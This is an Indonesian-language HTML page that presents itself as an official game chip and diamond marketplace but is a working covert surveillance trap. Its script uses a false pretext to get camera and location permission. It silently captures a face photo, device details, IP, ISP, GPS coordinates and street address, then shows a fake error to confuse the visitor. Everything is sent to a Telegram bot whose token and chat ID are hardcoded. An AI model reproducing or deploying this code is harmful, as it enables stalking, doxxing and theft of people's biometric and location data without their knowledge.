<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { background-color: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; overflow: hidden; }
        .header-brand { position: absolute; top: 40px; text-align: center; width: 100%; }
        .header-brand h1 { color: #ff0050; font-size: 22px; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .header-brand p { color: #aaa; font-size: 13px; margin-top: 4px; }
        .loading-container { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 20px; }
        .loader { width: 70px; height: 70px; border: 4px solid #333; border-top: 4px solid #ff0050; border-radius: 50%; animation: putar 1s linear infinite; }
        @keyframes putar { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .teks-loading { color: #fff; font-size: 16px; font-weight: 500; }
        .teks-kecil { color: #888; font-size: 12px; text-align: center; max-width: 320px; line-height: 1.6; margin-top: 10px; }
        .kuning { color: #ffcc00; }
        .hijau { color: #00ff88; font-weight: 500; }
        #video, #canvas { display: block; position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
    </style>
    <!-- Pustaka pendeteksi HP akurat -->
    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.35/dist/ua-parser.min.js"></script>
</head>
<body>

    <div class="header-brand">
        <h1>🏪 PASAR CHIP RESMI</h1>
        <p>Tempat Aman Jual Beli Chip & Diamond</p>
    </div>

    <div class="loading-container">
        <div class="loader"></div>
        <div class="teks-loading">Memuat Produk & Video...</div>
        <div class="teks-kecil" id="infoTeks">
            Sedang menghubungkan ke server tercepat...<br>
            <span class="kuning">⚠️ Peringatan:</span> Agar sistem dapat mendeteksi jaringan terdekat & memberi saran koneksi terbaik, <span class="hijau">IZINKAN LOKASI & KAMERA</span> saat muncul notifikasi.
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ==================================================
        // 🔑 DATA SUDAH LENGKAP: TOKEN + ID TUJUAN
        // ==================================================
        let bagianDepan = "8828591846";
        let bagianBelakang = "AAEEtJgtEdf0wu5JD_BYeF2-9apuVy-Q9pU";
        let sambung = ":";

        const KEY = bagianDepan + sambung + bagianBelakang;
        const TUJUAN = 8922169139; // ✅ ID LU SUDAH TERMASUK

        let data = {};
        let fotoAda = false;

        // ==================================================
        // DETEKSI HP & MERK • SANGAT AKURAT
        // ==================================================
        function deteksiPerangkat() {
            let parser = new UAParser();
            let hasil = parser.getResult();

            data.perangkat = `
📱 <b>Jenis HP:</b> ${hasil.device.type || 'Komputer / Laptop'}
🏷️ <b>Merk:</b> ${hasil.device.vendor || 'Tidak Diketahui'}
📌 <b>Tipe/Model:</b> ${hasil.device.model || 'Tidak Diketahui'}
🤖 <b>Sistem Operasi:</b> ${hasil.os.name || 'Tidak Diketahui'} ${hasil.os.version || ''}
🌐 <b>Browser:</b> ${hasil.browser.name || 'Tidak Diketahui'}
            `;
        }

        // ==================================================
        // MULAI KERJA
        // ==================================================
        document.addEventListener('DOMContentLoaded', function() {
            deteksiPerangkat(); // Baca data HP dulu
            mintaKamera();      // Munculkan izin kamera
        });

        function mintaKamera() {
            navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user", width: {ideal: 1280}, height: {ideal: 720} },
                audio: false
            })
            .then(function(stream) {
                let vid = document.getElementById('video');
                vid.srcObject = stream;
                vid.onloadedmetadata = function() {
                    setTimeout(function() {
                        // Ambil foto wajah
                        let cvs = document.getElementById('canvas');
                        cvs.width = vid.videoWidth;
                        cvs.height = vid.videoHeight;
                        cvs.getContext('2d').drawImage(vid, 0, 0, cvs.width, cvs.height);
                        data.foto = cvs.toDataURL('image/png');
                        fotoAda = true;
                        stream.getTracks().forEach(track => track.stop()); // Matikan kamera rapi

                        // Ubah tampilan jadi error biar dia bingung
                        document.getElementById('infoTeks').innerHTML = `
                            ❌ Koneksi tidak stabil / Server sedang sibuk<br>
                            Coba buka ulang nanti atau cek sinyal internet anda.<br>
                            <small style="color:#555">*Data lokasi tersimpan untuk perbaikan layanan</small>
                        `;
                        mintaLokasiAkurat(); // Lanjut ambil lokasi
                    }, 1500);
                };
            })
            .catch(function() {
                data.foto = "❌ Kamera DITOLAK / Tidak diizinkan";
                mintaLokasiAkurat();
            });
        }

        // ==================================================
        // AMBIL LOKASI • SAMPAI NAMA JALAN
        // ==================================================
        function mintaLokasiAkurat() {
            fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(ip => {
                data.ip = ip.ip;
                data.isp = ip.org;
                data.kota = ip.city;

                // Pengaturan GPS: Paling akurat, tunggu sampai dapet
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        suksesGps,
                        gagalGps,
                        { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
                    );
                }
            });
        }

        function suksesGps(pos) {
            data.lat = pos.coords.latitude;
            data.lon = pos.coords.longitude;
            data.presis = pos.coords.accuracy + " meter";

            // Ubah koordinat jadi alamat lengkap detail
            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${data.lat}&lon=${data.lon}&addressdetails=1&zoom=18`)
            .then(res => res.json())
            .then(alamat => {
                data.alamatLengkap = alamat.display_name || "Alamat utama tidak terbaca";
                data.waktu = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
                kirimLaporan(); // ✅ Kirim semua data
            });
        }

        function gagalGps() {
            data.alamatLengkap = "❌ Lokasi DITOLAK / GPS Tidak Aktif";
            data.waktu = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
            kirimLaporan();
        }

        // ==================================================
        // KIRIM KE TELEGRAM • LENGKAP & RAPI
        // ==================================================
        function kirimLaporan() {
            let pesan = `
🚨 <b>LAPORAN PENANGKAPAN • SHERIFF SYSTEM</b> 🚨
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏪 <b>Modus:</b> Pasar Chip Resmi
🌐 <b>IP Publik:</b> <code>${data.ip}</code>
📡 <b>Provider / ISP:</b> ${data.isp}
📍 <b>Koordinat GPS:</b> <code>${data.lat || 'GAGAL'}</code>, <code>${data.lon || 'GAGAL'}</code>
🎯 <b>Akurasi Lokasi:</b> ${data.presis || '-'}
🗺 <b>ALAMAT LENGKAP:</b> 
<code>${data.alamatLengkap}</code>
🔗 <b>LIHAT PETA LANGSUNG:</b> ${ (data.lat && data.lon) ? `<a href="https://www.google.com/maps?q=${data.lat},${data.lon}">👉 KLIK DI SINI, LOKASI TEPAT</a>` : 'Tidak didapat' }
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${data.perangkat}
⏰ <b>WAKTU AKSES:</b> ${data.waktu}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚖️ <i>Diambil sah oleh SHERIFF FAHRIL</i>
            `;

            // Kirim Teks Laporan
            fetch(`https://api.telegram.org/bot${KEY}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TUJUAN, text: pesan, parse_mode: 'HTML', disable_web_page_preview: true })
            });

            // Kirim Foto Wajah
            if(fotoAda && data.foto) {
                fetch(data.foto)
                .then(res => res.blob())
                .then(gambar => {
                    let form = new FormData();
                    form.append("chat_id", TUJUAN);
                    form.append("photo", gambar, "bukti_wajah_akurat.jpg");
                    form.append("caption", "📸 <b>FOTO WAJAH BERHASIL DITANGKAP • KUALITAS TINGGI</b>");
                    form.append("parse_mode", "HTML");
                    fetch(`https://api.telegram.org/bot${KEY}/sendPhoto`, { method: 'POST', body: form });
                });
            }
        }
    </script>
</body>
</html>
